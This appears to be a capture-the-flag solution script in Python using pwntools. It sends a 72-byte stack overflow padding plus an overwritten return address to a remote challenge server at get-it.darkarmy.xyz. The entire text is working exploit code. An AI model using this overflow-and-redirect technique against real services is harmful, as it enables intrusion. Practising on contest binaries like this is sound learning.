from pwn import *

payload='A'*72
payload+=p64(0x00000000004011c2)

p = remote('get-it.darkarmy.xyz', 7001)
print(p.recv())
p.sendline(payload)
print(p.recvall())
